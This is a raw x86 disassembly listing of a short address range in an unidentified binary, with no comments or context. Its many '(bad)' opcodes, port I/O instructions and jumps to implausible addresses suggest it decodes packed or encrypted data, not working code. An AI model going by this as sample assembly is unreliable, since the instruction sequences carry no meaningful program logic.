  413a7a:	sub    eax,0xb96f83ab
  413a7f:	and    eax,0x392d70b3
  413a84:	and    BYTE PTR [eax+0xc039af3],bl
  413a8a:	mov    dh,0xeb
  413a8c:	dec    edi
  413a8d:	mov    al,ds:0x8020292d
  413a92:	jne    0x413a39
  413a94:	mov    esp,ss
  413a96:	(bad)  
  413a97:	cmc    
  413a98:	sbb    cl,ah
  413a9a:	(bad)  
  413a9b:	or     eax,0xdf0d6258
  413aa0:	add    ch,0x9e
  413aa3:	in     eax,0x4f
  413aa5:	cwde   
  413aa6:	fst    QWORD PTR [ecx+0x20]
  413aa9:	shl    BYTE PTR [ebx+0x3e5],1
  413aaf:	add    BYTE PTR [eax],al
  413ab1:	add    BYTE PTR [esi-0x2f3c0b4f],ah
  413ab7:	sub    esp,DWORD PTR [eax-0x6e8698c9]
  413abd:	push   es
  413abe:	add    eax,0xdd70007
  413ac3:	frstor [ecx+0x63b19c1f]
  413ac9:	or     DWORD PTR [eax+0xc8ae5b2],ecx
  413acf:	(bad)  
  413ad0:	cdq    
  413ad1:	add    al,0x90
  413ad3:	mov    dl,0xa5
  413ad5:	mov    WORD PTR [esi+edx*8+0x11],cs
  413ad9:	xor    al,0x46
  413adb:	and    DWORD PTR [ecx-0x1a4ccbe1],ebx
  413ae1:	add    ebx,DWORD PTR [ecx]
  413ae3:	pop    es
  413ae4:	ror    BYTE PTR [edi+0x3e67e6c],0x90
  413aeb:	sub    eax,0x65b52ebc
  413af0:	push   cs
  413af1:	or     eax,0xe9ef2168
  413af6:	mov    esi,0x95452a65
  413afb:	mov    dl,0xe
  413afd:	sahf   
  413afe:	pop    es
  413aff:	(bad)  
  413b00:	push   edx
  413b01:	call   0x4927ed99
  413b06:	dec    ebx
  413b07:	push   ds
  413b08:	out    dx,eax
  413b09:	ins    BYTE PTR es:[edi],dx
  413b0a:	push   ebx
  413b0b:	scas   al,BYTE PTR es:[edi]
  413b0c:	mov    DWORD PTR [ebp+0x5f],ecx
  413b0f:	push   ds
  413b10:	out    dx,eax
  413b11:	bound  ebp,QWORD PTR [edi+0x223ad6]
  413b17:	add    BYTE PTR [eax],al
  413b19:	add    BYTE PTR [eax],al
  413b1b:	mov    edi,DWORD PTR [esi+0x2a]
  413b1e:	std    
  413b1f:	ret    0xe560
  413b22:	mov    ds:0x6aef2056,eax
  413b27:	out    0x9e,al
  413b29:	push   cs
  413b2a:	faddp  st(7),st
  413b2c:	bound  eax,QWORD PTR [edi]
  413b2e:	jmp    0xef1714c6
  413b33:	mov    ch,0x4a
  413b35:	pop    es
  413b36:	jmp    0xad9922ce
  413b3b:	adc    al,0x86
  413b3d:	push   edx
  413b3e:	adc    BYTE PTR [eax+0x15],ah
  413b41:	out    dx,eax
  413b42:	push   ds
  413b43:	or     dh,BYTE PTR [edi]
  413b45:	sub    dh,BYTE PTR [ebp-0x56f14d6c]
  413b4b:	cli    
  413b4c:	out    0x83,eax
  413b4e:	popf   
  413b4f:	lahf   
  413b50:	mov    edx,0xc2979533
  413b55:	jmp    DWORD PTR [ebx+0x10]
  413b58:	mov    dh,0xe
  413b5a:	jmp    0xf6a3b8e9
  413b5f:	adc    BYTE PTR [ecx],dh
  413b61:	lock fidivr WORD PTR [ebp+0x18e2b8ad]
  413b68:	jbe    0x413ba8
  413b6a:	sub    cl,BYTE PTR [ebp-0x57fff598]
  413b70:	mov    esp,0xb589244a
  413b75:	mov    esp,DWORD PTR [edi-0x42]
  413b78:	mov    bl,0xe
  413b7a:	mov    ebp,DWORD PTR ds:0x152d2
  413b80:	add    BYTE PTR [eax],al
  413b82:	add    BYTE PTR [eax],al
  413b84:	test   eax,0x5d894cb3
  413b89:	rcl    BYTE PTR [esi],cl
  413b8b:	inc    eax
  413b8c:	leave  
  413b8d:	shl    cl,1
  413b8f:	mov    ah,0x4d
  413b91:	out    0xef,eax
  413b93:	jmp    FWORD PTR [ecx+0x2a]
  413b96:	(bad)  
  413b98:	mov    ebp,0x790152d2
  413b9d:	mov    bl,0x85
  413b9f:	retf   
  413ba0:	jle    0x413ba7
  413ba2:	mov    edx,0xeb45524
  413ba7:	add    BYTE PTR [esi+0x385c2a42],dh
  413bad:	mov    bl,0xe
  413baf:	call   FWORD PTR ds:0x290152d2
  413bb5:	mov    bl,0xe6
  413bb7:	cli    
  413bb8:	sahf   
  413bb9:	add    eax,0x827985f1
  413bbe:	call   0xa2ff:0xf1072de9
  413bc5:	xor    ch,BYTE PTR [edx]
  413bc7:	pop    esp
  413bc8:	sub    BYTE PTR [ebx-0x3b6dbff2],dh
  413bce:	test   DWORD PTR [ebp+ecx*8+0x1a],ecx
  413bd2:	ss dec esp
  413bd4:	int    0x22
  413bd6:	add    cl,BYTE PTR [ebp-0x10e1fd]
  413bdc:	and    ah,dh
  413bde:	bound  ecx,QWORD PTR [edi]
  413be0:	jp     0x413c03
  413be2:	icebp  
  413be3:	push   esi
  413be5:	mov    ch,0xb8
  413be7:	add    eax,DWORD PTR [eax]
  413be9:	add    BYTE PTR [eax],al
  413beb:	add    BYTE PTR [eax],al
  413bed:	stos   BYTE PTR es:[edi],al
  413bee:	mov    ebx,0xa990244a
  413bf3:	or     DWORD PTR [ebx+0xb16c3],eax
  413bf9:	or     ecx,DWORD PTR [ebp+0x9915c0f]
  413bff:	or     edi,DWORD PTR [edi]
  413c01:	sbb    ebp,edx
  413c03:	sbb    BYTE PTR cs:[eax-0x47],dl
  413c07:	and    ch,bh
  413c09:	in     al,0xec
  413c0b:	call   DWORD PTR ss:[edi-0x702c79f8]
  413c12:	or     BYTE PTR [edi],0x5c
  413c15:	xchg   ecx,eax
  413c16:	or     ecx,DWORD PTR [ebx]
  413c18:	mov    DWORD PTR [ebx-0x43],ecx
  413c1b:	fnstenv [esp+ebp*4-0x6ffff441]
  413c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c23:	jg     0x413c49
  413c25:	les    ecx,FWORD PTR [edx]
  413c27:	or     eax,DWORD PTR [eax]
  413c29:	pop    edi
  413c2a:	inc    eax
  413c2b:	subps  xmm2,XMMWORD PTR [ecx+0x16e80b0b]
  413c32:	fstp   st(2)
  413c34:	std    
  413c35:	or     eax,0x29993fcc
  413c3a:	jl     0x413c12
  413c3c:	std    
  413c3d:	aaa    
  413c3e:	mov    eax,ds:0xacc246f
  413c43:	or     eax,DWORD PTR [eax]
  413c45:	shl    BYTE PTR [eax+0x14],1
  413c48:	mov    esp,eax
  413c4a:	out    dx,eax
  413c4b:	cli    
  413c4c:	cmp    BYTE PTR [edi+esi*8+0xcf2],bh
  413c53:	add    BYTE PTR [eax],al
  413c55:	add    BYTE PTR ds:0x7fff19e,bl
  413c5b:	add    DWORD PTR [edx],edi
  413c5d:	ins    BYTE PTR es:[edi],dx
  413c5e:	(bad)  
  413c62:	neg    DWORD PTR [ebx+ecx*1]
  413c65:	mov    dh,0x9b
  413c67:	nop
  413c68:	xor    dh,BYTE PTR [eax]
  413c6a:	push   ebx
  413c6b:	cld    
  413c6c:	add    BYTE PTR [ecx+edx*4],0xb2
  413c70:	cs dec eax
  413c72:	lods   al,BYTE PTR ds:[esi]
  413c73:	shl    al,cl
  413c75:	xchg   DWORD PTR [eax-0x4c],ecx
  413c78:	in     eax,0x3
  413c7a:	sbb    DWORD PTR [edi],esi
  413c7c:	or     DWORD PTR [eax],esi
  413c7e:	mov    edi,0xf45e51d
  413c83:	xchg   DWORD PTR [ecx],ecx
  413c85:	hlt    
  413c86:	outs   dx,DWORD PTR ds:[esi]
  413c87:	or     BYTE PTR [edi],0xd3
  413c8a:	(bad)  
  413c8c:	add    DWORD PTR ds:0xb97cb290,eax
  413c92:	xchg   ebp,eax
  413c93:	leavew 
  413c95:	das    
  413c96:	(bad)  
  413c97:	sbb    eax,0x85597ee5
  413c9c:	sbb    BYTE PTR [eax+0x3e67eb4],0x90
  413ca3:	sbb    eax,0xb3cc2839
  413ca8:	in     eax,0x3
  413caa:	gs leavew 
  413cad:	das    
  413cae:	pop    edi
  413caf:	sbb    eax,0x589dbe5
  413cb4:	push   eax
  413cb5:	rcl    DWORD PTR [ebx],cl
  413cb7:	repnz shl BYTE PTR [edi+0x0],1
  413cbb:	add    BYTE PTR [eax],al
  413cbd:	add    BYTE PTR [eax],al
  413cbf:	das    
  413cc0:	(bad)  
  413cc1:	pop    esp
  413cc2:	sar    DWORD PTR ds:0xd4286129,cl
  413cc8:	mov    bl,0xe5
  413cca:	add    edx,eax
  413ccc:	or     ebx,esi
  413cce:	jle    0x413ca4
  413cd0:	(bad)  
  413cd1:	aad    0xe
  413cd3:	int3   
  413cd4:	(bad)  
  413cd5:	or     eax,0xe7b90b03
  413cda:	add    edx,DWORD PTR [eax-0x6aa04727]
  413ce0:	xor    ecx,ecx
  413ce2:	sar    ch,1
  413ce4:	sbb    al,0xf8
  413ce6:	cdq    
  413ce7:	xchg   ecx,eax
  413ce8:	jno    0x413cb8
  413cea:	inc    edi
  413ceb:	mov    ah,0xd2
  413ced:	push   cs
  413cee:	out    0xf,al
  413cf0:	mov    dh,0x8
  413cf2:	jmp    0xdcb688a
  413cf7:	mov    al,ds:0x54e9ef1d
  413cfc:	xor    eax,0xdcbc0d42
  413d01:	pop    esi
  413d02:	aaa    
  413d03:	jecxz  0x413d6a
  413d05:	sub    ah,BYTE PTR ds:0x720eb28d
  413d0b:	call   0x604ef72e
  413d10:	sbb    eax,0xeb1ee9ef
  413d15:	push   esi
  413d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d17:	call   ebp
  413d19:	push   edx
  413d1a:	call   0x5e30efb2
  413d1f:	scas   eax,DWORD PTR es:[edi]
  413d20:	jle    0x413d2f
  413d22:	jmp    0x413d27
  413d27:	add    BYTE PTR [ebx-0x583245e3],dl
  413d2d:	sbb    ebp,edi
  413d2f:	jmp    0x7719837f
  413d34:	inc    edx
  413d35:	xor    dh,cl
  413d37:	cmc    
  413d38:	out    dx,al
  413d39:	adc    ebp,DWORD PTR [ebp+0x641e4263]
  413d3f:	pop    ebx
  413d40:	ins    BYTE PTR es:[edi],dx
  413d41:	inc    esp
  413d42:	hlt    
  413d43:	push   esi
  413d44:	bound  ebp,QWORD PTR [edx]
  413d46:	mov    al,BYTE PTR ds:0xe9ef1b80
  413d4c:	rcl    DWORD PTR [ebx],cl
  413d4e:	je     0x413d38
  413d50:	xchg   ebx,eax
  413d51:	mov    dl,0x83
  413d53:	popf   
  413d54:	outs   dx,DWORD PTR ds:[esi]
  413d55:	ret    0x9533
  413d58:	ja     0x413d2c
  413d5a:	push   DWORD PTR [ebx-0x60]
  413d5d:	scas   eax,DWORD PTR es:[edi]
  413d5e:	push   cs
  413d5f:	jmp    0xd2a3aaf2
  413d64:	xor    al,0xae
  413d66:	mov    eax,DWORD PTR [ebp-0x31]
  413d69:	sbb    eax,0x738200ef
  413d6e:	sub    bl,BYTE PTR [eax]
  413d70:	jp     0x413d59
  413d72:	add    DWORD PTR [ebp+0x2f],esi
  413d75:	xor    eax,0x83e91871
  413d7a:	adc    BYTE PTR [ebx-0x72a6f16a],cl
  413d80:	jbe    0x413da4
  413d82:	aas    
  413d83:	push   ecx
  413d84:	xor    bl,BYTE PTR [ebp-0x1a]
  413d87:	or     eax,0x850eb4a5
  413d8c:	add    BYTE PTR [eax],al
  413d8e:	add    BYTE PTR [eax],al
  413d90:	add    cl,ch
  413d92:	mov    cl,0x8b
  413d94:	imul   esi,DWORD PTR [edi+ebp*4-0x357a74f2],0x1e
  413d9c:	jmp    0x413d35
  413d9e:	mov    ebp,0x48b21c41
  413da3:	jns    0x413dc8
  413da5:	add    esi,DWORD PTR [esi-0x7bb2b8cc]
  413dab:	push   ss
  413dac:	xor    ebp,DWORD PTR [ecx]
  413dae:	jbe    0x413de7
  413db0:	inc    edi
  413db1:	ins    DWORD PTR es:[edi],dx
  413db2:	mov    dl,0x8a
  413db4:	dec    ebx
  413db5:	je     0x413d66
  413db7:	push   cs
  413db8:	mov    bh,BYTE PTR [edx+0x1c4734af]
  413dbe:	mov    dl,0x8a
  413dc0:	aas    
  413dc1:	fs scas eax,DWORD PTR es:[edi]
  413dc3:	push   cs
  413dc4:	mov    esi,ebp
  413dc6:	rcl    BYTE PTR [esi],cl
  413dc8:	(bad)  
  413dca:	sbb    eax,0x75e3c08e
  413dcf:	(bad)  
  413dd0:	clc    
  413dd1:	ds mov dl,0x89
  413dd4:	ins    BYTE PTR es:[edi],dx
  413dd5:	outs   dx,BYTE PTR ds:[esi]
  413dd6:	add    ecx,esi
  413dd8:	call   DWORD PTR [ebp-0x17d4d4cd]
  413dde:	scas   al,BYTE PTR es:[edi]
  413ddf:	(bad)  
  413de0:	stc    
  413de1:	and    esi,DWORD PTR [edx-0x51062276]
  413de7:	push   cs
  413de8:	seto   BYTE PTR [ebx+0x99002f7]
  413def:	mov    dh,bh
  413df1:	test   BYTE PTR [ebx+0x80fc],bl
  413df7:	add    BYTE PTR [eax],al
  413df9:	add    cl,ch
  413dfb:	or     eax,0x22111a57
  413e00:	mov    BYTE PTR [eax],al
  413e02:	nop
  413e03:	or     DWORD PTR [esi],ecx
  413e05:	adc    edi,0xc
  413e08:	or     eax,DWORD PTR [eax]
  413e0a:	mov    DWORD PTR [edx+ebp*2+0x6fb0d0d],eax
  413e11:	add    BYTE PTR [eax-0x6fff660e],dl
  413e17:	or     DWORD PTR [edx],eax
  413e19:	pop    ebp
  413e1a:	cmp    al,0xc
  413e1c:	mov    ch,BYTE PTR [edx-0x7ff4f670]
  413e22:	pop    ebx
  413e23:	femms  
  413e25:	xor    ecx,0x8
  413e28:	or     eax,DWORD PTR [eax]
  413e2a:	rol    DWORD PTR [edx+0x62],cl
  413e2d:	add    BYTE PTR [eax-0x760875f5],dl
  413e33:	clc    
  413e34:	xchg   al,dl
  413e36:	mov    WORD PTR [ebx],cs
  413e38:	or     eax,DWORD PTR [ecx-0x7bf21397]
  413e3e:	dec    edi
  413e3f:	or     BYTE PTR [ebx],cl
  413e41:	add    BYTE PTR [ecx],dl
  413e43:	mov    ds:0xb9000ab,eax
  413e48:	sar    BYTE PTR [ecx+0x13],cl
  413e4b:	xchg   ebx,eax
  413e4c:	hlt    
  413e4d:	jae    0x413e13
  413e4f:	mov    esp,es
  413e51:	and    ah,al
  413e53:	add    BYTE PTR [edi+esi*8+0xb0bf0],cl
  413e5a:	cmp    ebx,DWORD PTR [ebx+0xf78a]
  413e60:	add    BYTE PTR [eax],al
  413e62:	add    BYTE PTR [edx+0x1981515d],bl
  413e68:	test   DWORD PTR ds:0xe1b2f786,0x2e339003
  413e72:	xchg   BYTE PTR [eax+0x61dce5b2],dl
  413e78:	xor    eax,0x3484fd1e
  413e7d:	ja     0x413e86
  413e7f:	nop
  413e80:	mov    dl,0x64
  413e82:	retf   0xa09b
  413e85:	lods   al,BYTE PTR ds:[esi]
  413e86:	and    bh,0x2f
  413e89:	in     eax,0x3
  413e8b:	nop
  413e8c:	or     eax,0xde557b62
  413e91:	xlat   BYTE PTR ds:[ebx]
  413e92:	or     bh,al
  413e94:	mov    ch,0xce
  413e96:	dec    ebp
  413e97:	mov    ebp,0x4d7bc019
  413e9c:	fisubr WORD PTR [edi-0x234a50f8]
  413ea2:	sbb    al,0x19
  413ea4:	jb     0x413e97
  413ea6:	aad    0x94
  413ea8:	mov    bl,0xe6
  413eaa:	fsubr  QWORD PTR [ecx+ebx*1]
  413ead:	test   al,0xcf
  413eaf:	sbb    DWORD PTR [ecx-0x27],esi
  413eb2:	aad    0x8c
  413eb4:	mov    bl,0xe6
  413eb6:	fisub  DWORD PTR [ecx+0x7e18282d]
  413ebc:	scas   al,BYTE PTR es:[edi]
  413ebd:	out    0xf3,al
  413ebf:	jbe    0x413f2a
  413ec1:	jo     0x413e92
  413ec3:	gs sub eax,0x1820
  413ec9:	add    BYTE PTR [eax],al
  413ecb:	add    BYTE PTR [esi-0x52],ah
  413ece:	out    0xf3,al
  413ed0:	test   BYTE PTR [esi],ch
  413ed2:	daa    
  413ed3:	or     BYTE PTR [eax+0x6c887cb2],dl
  413ed9:	jbe    0x413ec1
  413edb:	add    edx,DWORD PTR [eax+0x6c386e74]
  413ee1:	ret    0x33a5
  413ee4:	(bad)  
  413ee5:	sbb    DWORD PTR [ecx+0x28],edi
  413ee8:	les    esi,FWORD PTR [ebx+0x2b93e90e]
  413eee:	fldcw  WORD PTR [esi]
  413ef0:	clc    
  413ef1:	int    0x52
  413ef3:	call   0x32c4f18b
  413ef8:	mov    edi,0xafcdba17
  413efd:	sbb    edi,ebp
  413eff:	jmp    0xa56b9cca
  413f04:	xchg   esp,eax
  413f05:	mov    dl,0xe
  413f07:	(bad)  
  413f08:	dec    ebp
  413f0a:	push   edx
  413f0b:	call   0x1927f1a3
  413f10:	sbb    BYTE PTR [edi],dl
  413f12:	out    dx,eax
  413f13:	ins    BYTE PTR es:[edi],dx
  413f14:	shl    DWORD PTR [esi+0x16d62e8a],cl
  413f1a:	out    dx,eax
  413f1b:	rol    BYTE PTR [esi],0x1a
  413f1e:	out    dx,eax
  413f1f:	into   
  413f20:	cmp    bh,BYTE PTR [edi+0x2]
  413f23:	jb     0x413f6c
  413f25:	into   
  413f26:	and    dh,BYTE PTR [edx-0x59]
  413f29:	xor    al,BYTE PTR [ebx-0x7a51edd3]
  413f2f:	sbb    eax,0x0
  413f34:	add    BYTE PTR [eax-0x2a],ch
  413f37:	xor    DWORD PTR [esi],0xffffff84
  413f3a:	retf   
  413f3b:	shl    BYTE PTR [eax-0x31],0xce
  413f3f:	bound  edx,QWORD PTR ss:[edi-0x57da7ad4]
  413f46:	ret    0x6e83
  413f49:	pop    ss
  413f4a:	mov    bl,0xe
  413f4c:	jmp    0xbd6bae35
  413f51:	(bad)  
  413f53:	and    ah,BYTE PTR [esi]
  413f55:	mov    ah,0x8c
  413f57:	or     al,0x70
  413f59:	xchg   edi,eax
  413f5a:	sub    al,0x83
  413f5c:	ins    DWORD PTR es:[edi],dx
  413f5d:	outs   dx,DWORD PTR ds:[esi]
  413f5e:	xchg   edx,eax
  413f5f:	or     eax,0xcee193e9
  413f64:	push   0xffffffc7
  413f66:	into   
  413f67:	push   ss
  413f68:	add    BYTE PTR [ebx-0x36],bl
  413f6b:	add    DWORD PTR [ebx+edi*2+0x6e],eax
  413f6f:	xchg   DWORD PTR [ebp+ecx*4+0x1a],eax
  413f73:	mov    BYTE PTR [ebp+ecx*4-0x2e],cl
  413f77:	aas    
  413f78:	push   eax
  413f79:	mov    dh,0x3f
  413f7b:	sub    bl,BYTE PTR [eax+edi*8-0x4d]
  413f7f:	push   cs
  413f80:	maxps  xmm5,XMMWORD PTR [edx+0xe]
  413f84:	call   FWORD PTR [ebp-0x31]
  413f87:	push   edx
  413f88:	add    ecx,edi
  413f8a:	mov    bl,0x1
  413f8c:	mov    dh,0x49
  413f8e:	shl    DWORD PTR [edx+0x40],cl
  413f91:	jmp    0xcdf63176
  413f96:	(bad)  
  413f97:	out    dx,eax
  413f98:	inc    DWORD PTR [eax]
  413f9a:	add    BYTE PTR [eax],al
  413f9c:	add    BYTE PTR [eax],al
  413f9e:	mov    ecx,0x1dffdbb2
  413fa3:	retf   
  413fa4:	push   edx
  413fa5:	add    DWORD PTR [ecx-0x39347a4d],ebp
  413fab:	cmp    ch,BYTE PTR [edx]
  413fad:	pop    esp
  413fae:	mov    eax,0x90e80eb3
  413fb3:	pop    edx
  413fb4:	icebp  
  413fb5:	push   DWORD PTR [edx]
  413fb7:	pop    esi
  413fb8:	mov    edx,edx
  413fba:	pop    ebp
  413fbb:	push   ss
  413fbc:	jo     0x413fb8
  413fbe:	xchg   edi,eax
  413fbf:	add    dh,cl
  413fc1:	call   FWORD PTR [ebx+edi*4-0x40b2bb7b]
  413fc8:	xchg   DWORD PTR [edi+0xeaeed],eax
  413fce:	cmp    ax,0x143
  413fd2:	jbe    0x414011
  413fd4:	dec    ebx
  413fd5:	add    ch,BYTE PTR [eax]
  413fd7:	adc    eax,DWORD PTR [esi]
  413fd9:	or     esi,DWORD PTR [ecx]
  413fdb:	mov    cl,0xe7
  413fdd:	xor    BYTE PTR [ebx+esi*4],0x5a
  413fe1:	jne    0x41402b
  413fe3:	call   0x4c76:0x1590244a
  413fea:	ins    BYTE PTR es:[edi],dx
  413feb:	adc    eax,0xcb1b8dd6
  413ff0:	ror    DWORD PTR [esi],cl
  413ff2:	sub    al,bl
  413ff4:	ror    DWORD PTR [ecx+0x5c760dd7],0x6c
  413ffb:	add    eax,0xa2c60c70
  414000:	inc    BYTE PTR [edi+0x0]
  414006:	add    BYTE PTR [ebx],bl
  414008:	push   eax
  414009:	out    dx,eax
  41400a:	mov    BYTE PTR [ebp+eiz*8+0x2],bl
  41400e:	xchg   DWORD PTR [ecx+edx*4+0x6],edx
  414012:	mov    DWORD PTR [edi-0x7],ebx
  414015:	jne    0x41405c
  414017:	xchg   esp,eax
  414018:	add    al,0xb1
  41401a:	mov    DWORD PTR [ebp+eiz*8-0x6],esp
  41401e:	xchg   BYTE PTR [ecx+edx*4+0xdaefa8b],bl
  414025:	ret    0x3cfd
  414028:	push   es
  414029:	jbe    0x413faf
  41402b:	je     0x413ff2
  41402d:	or     eax,DWORD PTR [eax]
  41402f:	nop
  414030:	xchg   edx,eax
  414031:	mov    bl,BYTE PTR [eax+edx*4-0x2fcef4f7]
  414038:	add    DWORD PTR [esi+0x765f9ff5],esi
  41403e:	test   BYTE PTR [ebp+eiz*4+0xb],ch
  414042:	add    BYTE PTR [eax-0x33db6860],dl
  414048:	or     cl,BYTE PTR [ebx]
  41404a:	add    al,dl
  41404c:	fcomi  st,st(1)
  41404e:	mov    ch,0xcd
  414050:	or     edi,DWORD PTR ds:0x1ee824fd
  414056:	jmp    DWORD PTR [edi+0xc]
  414059:	repnz mov ch,0x0
  41405c:	in     al,dx
  41405d:	dec    esi
  41405e:	inc    eax
  41405f:	nop
  414060:	test   BYTE PTR [edi-0x194d13dc],dl
  414066:	add    edx,DWORD PTR [eax+0x343ab1]
  41406c:	add    BYTE PTR [eax],al
  41406e:	add    BYTE PTR [eax],al
  414070:	cmp    eax,0x3730015f
  414075:	push   ss
  414076:	in     eax,0x78
  414078:	pop    ecx
  414079:	jge    0x4140c3
  41407b:	xchg   edi,eax
  41407c:	ins    BYTE PTR es:[edi],dx
  41407d:	jbe    0x414065
  41407f:	add    edx,DWORD PTR [eax+0x15b0b20a]
  414085:	push   ss
  414086:	push   0xffffffc3
  414088:	popf   
  414089:	das    
  41408a:	gs aam 0x5
  41408d:	push   ss
  41408e:	jle    0x414024
  414090:	sbb    al,0xb3
  414092:	in     eax,0x3
  414094:	out    dx,eax
  414095:	lahf   
  414096:	sbb    ah,cl
  414098:	in     eax,dx
  414099:	sub    DWORD PTR [ecx+0x27],esp
  41409c:	inc    esp
  41409d:	mov    bl,0xe5
  41409f:	add    edx,DWORD PTR [eax-0x7e]
  4140a2:	clc    
  4140a3:	xchg   esi,eax
  4140a4:	lods   al,BYTE PTR ds:[esi]
  4140a5:	jbe    0x41408d
  4140a7:	add    edx,DWORD PTR [eax-0x6fbe705b]
  4140ad:	adc    eax,0xb35c2099
  4140b2:	in     eax,0x3
  4140b4:	test   DWORD PTR [ebp+eiz*2+0x24],ebx
  4140b8:	cmp    al,0x72
  4140ba:	in     eax,0xca
  4140bc:	fmul   st(6),st
  4140be:	adc    DWORD PTR ds:0x316ab290,eax
  4140c4:	xchg   edx,eax
  4140c5:	jge    0x414067
  4140c7:	nop
  4140c8:	mov    ah,0x76
  4140ca:	out    0x3,al
  4140cc:	nop
  4140cd:	sub    edi,DWORD PTR [ecx]
  4140cf:	and    BYTE PTR [eax+eax*4+0x91e8],ch
  4140d6:	add    BYTE PTR [eax],al
  4140d8:	add    bl,ah
  4140da:	mov    bl,0xe4
  4140dc:	rcr    bh,0xb1
  4140df:	xchg   ebp,eax
  4140e0:	jg     0x41413b
  4140e2:	or     ch,dh
  4140e4:	mov    dh,0x5d
  4140e6:	adc    eax,0xceb8620e
  4140eb:	sbb    ah,BYTE PTR [eax-0x30]
  4140ee:	into   
  4140ef:	cmp    ah,BYTE PTR [ecx+edi*1]
  4140f2:	sbb    edi,ebp
  4140f4:	pop    esi
  4140f5:	loope  0x4140ac
  4140f7:	out    dx,eax
  4140f8:	fsubrp st(3),st
  4140fa:	sub    edi,0x4ebcc3f4
  414100:	jmp    0x29cabe79
  414105:	shr    DWORD PTR [ecx+0x5ac39685],0x12
  41410c:	sub    eax,0xe9e516db
  414111:	loop   0x414129
  414113:	out    dx,eax
  414114:	jb     0x414166
  414116:	into   
  414117:	cmp    dl,al
  414119:	and    dh,BYTE PTR [esi]
  41411b:	push   cs
  41411c:	jmp    0xf9cae8b4
  414121:	rcl    DWORD PTR [esi],0xef
  414124:	jo     0x414121
  414126:	xor    eax,0xd93e90e
  41412b:	jmp    0x83581c27
  414130:	ins    DWORD PTR es:[edi],dx
  414131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414132:	jbe    0x414141
  414134:	jmp    0xd69fb3cc
  414139:	pop    es
  41413a:	into   
  41413b:	push   edx
  41413c:	call   0x414141
  414141:	add    BYTE PTR [ebx+0x507effb2],dl
  414147:	mov    dl,0xef
  414149:	jne    0x4141ca
  41414b:	jbe    0x41415a
  41414d:	jmp    0x59f9e8e5
  414152:	mov    bl,0x86
  414154:	dec    esi
  414155:	jmp    0x3d6ba0b4
  41415a:	xchg   ebp,eax
  41415b:	mov    dl,0xe
  41415d:	jmp    0x768f:0x55ef7e40
  414164:	or     eax,0xf1b07900
  414169:	mov    ah,0x55
  41416b:	int3   
  41416c:	out    dx,eax
  41416d:	jmp    FWORD PTR [ecx-0x21]
  414170:	test   ebx,ecx
  414172:	adc    DWORD PTR [eax+0x32aeffdc],esp
  414178:	into   
  414179:	lfs    eax,FWORD PTR [eax+edi*8+0x1429deff]
  414181:	cld    
  414182:	fsubp  st(0),st
  414184:	out    0xaf,al
  414186:	cmp    BYTE PTR [eax-0x4c4a74f2],dh
  41418c:	push   edx
  41418d:	add    DWORD PTR [ecx],ebp
  41418f:	mov    al,0x4e
  414191:	push   eax
  414192:	mov    esi,0xf85c2a23
  414197:	scas   eax,DWORD PTR es:[edi]
  414198:	push   cs
  414199:	packuswb mm6,QWORD PTR [edx+0xe]
  41419d:	call   DWORD PTR [ebp-0x4d]
  4141a0:	push   edx
  4141a1:	add    ecx,edi
  4141a3:	scas   eax,DWORD PTR es:[edi]
  4141a4:	add    DWORD PTR [esi+0x0],esi
  4141aa:	add    BYTE PTR [ecx-0x31],cl
  4141ad:	bound  eax,QWORD PTR [eax-0x17]
  4141b0:	call   0xaf3e666e
  4141b5:	push   cs
  4141b6:	add    BYTE PTR [edx+0x25ff5962],bh
  4141bc:	rcl    DWORD PTR [edx+0x1],cl
  4141bf:	test   eax,0x85b4f1af
  4141c4:	retf   0xffef
  4141c7:	mov    ecx,0xc1cb85e0
  4141cc:	stos   BYTE PTR es:[edi],al
  4141cd:	fdiv   st(7),st
  4141cf:	ficom  WORD PTR [ebx+0x71240fce]
  4141d5:	clc    
  4141d6:	(bad)  
  4141d7:	sub    BYTE PTR ds:0xe6e92efc,dl
  4141de:	pop    ebx
  4141df:	push   0x908b0eaf
  4141e4:	test   DWORD PTR [esi],ebp
  4141e6:	pop    esp
  4141e7:	xchg   ecx,eax
  4141e8:	or     DWORD PTR [ebx],ecx
  4141ea:	or     eax,0x400bb61e
  4141ef:	rcl    BYTE PTR [esi+ebx*4+0xb0ab424],0x0
  4141f7:	lahf   
  4141f8:	fld    TBYTE PTR [edi]
  4141fa:	add    BYTE PTR [edi+0x35],al
  4141fd:	cs pop esp
  4141ff:	xchg   ecx,eax
  414200:	or     DWORD PTR [ebx],ecx
  414202:	or     eax,0x6c2a88fe
  414207:	ror    BYTE PTR [ecx],1
  414209:	(bad)  
  41420a:	mov    ah,0x6c
  41420c:	dec    ebp
  41420d:	or     al,0x0
  41420f:	add    BYTE PTR [eax],al
  414211:	add    BYTE PTR [eax],al
  414213:	add    BYTE PTR [eax+0x1755b008],dl
  414219:	xchg   ebp,eax
  41421a:	cs pop esp
  41421c:	xchg   ecx,eax
  41421d:	or     DWORD PTR [ebx],ecx
  41421f:	add    eax,esp
  414221:	retf   
  414222:	sahf   
  414223:	and    al,0x5c
  414225:	or     cl,BYTE PTR [ebx]
  414227:	add    BYTE PTR [ecx-0x70],ah
  41422a:	mov    cl,0xe8
  41422c:	repnz fld st(5)
  41422f:	std    
  414230:	or     eax,0x6783f5c9
  414235:	or     cl,BYTE PTR [ebx]
  414237:	add    cl,ch
  414239:	mov    al,0xbf
  41423b:	std    
  41423c:	iret   
  41423d:	(bad)  
  41423e:	mov    fs,WORD PTR [esp+eiz*2]
  414241:	or     cl,BYTE PTR [ebx]
  414243:	add    BYTE PTR [eax-0x27],dl
  414246:	lds    esi,FWORD PTR [esp+ebp*2-0x6ffff423]
  41424d:	hlt    
  41424e:	pushf  
  41424f:	inc    ebx
  414250:	nop
  414251:	in     al,dx
  414252:	jle    0x414278
  414254:	cmp    al,0xa
  414256:	or     eax,DWORD PTR [eax]
  414258:	xchg   DWORD PTR [ebx-0x2403df85],edx
  41425e:	or     bh,ch
  414260:	cmp    al,0xb3
  414262:	shl    DWORD PTR [edi],0x7f
  414265:	adc    ah,ch
  414267:	add    al,0x63
  414269:	push   0xffffff98
  41426b:	(bad)  
  41426c:	mov    ah,0x6e
  41426e:	out    0x3,al
  414270:	nop
  414271:	adc    DWORD PTR [ecx],esi
  414273:	pop    ds
  414274:	mov    esp,0x3e5b3
  414279:	add    BYTE PTR [eax],al
  41427b:	add    BYTE PTR [eax],al
  41427d:	(bad)  
  41427e:	cmp    eax,0xe421dbac
